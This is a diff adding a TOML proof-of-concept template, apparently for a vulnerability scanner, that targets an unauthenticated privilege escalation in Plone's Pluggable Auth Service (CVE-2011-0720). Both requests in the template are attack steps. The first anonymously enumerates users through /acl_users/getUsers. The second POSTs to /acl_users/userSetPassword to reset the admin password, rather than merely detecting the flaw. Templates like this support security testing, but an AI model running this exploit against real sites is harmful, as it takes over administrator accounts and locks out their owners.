@@ -1,0 +1,48 @@
+[info]
+author = "ave"
+description = "检测 Plone 2.5-4.0 中 Pluggable Auth Service (PAS) 未授权访问漏洞。攻击者可匿名访问 /acl_users/getUsers 枚举用户，再通过 /acl_users/userSetPassword 修改任意用户密码，实现未授权提权至管理员。"
+id = "POC-AVE-2011-0058"
+name = "Plone PAS Unauthenticated Privilege Escalation PoC"
+severity = "critical"
+tags = ["ave-2011-0058"]
+vuln_id = [
+    "CVE-2011-0720",
+    "AVE-2011-0058",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/acl_users/getUsers"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "userid",
+    "login",
+    "password",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/acl_users/userSetPassword"
+protocol = "http"
+
+[poc.requests.body]
+content = "userid=admin&password=SecTest123!"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "changed",
+    "updated",
+]
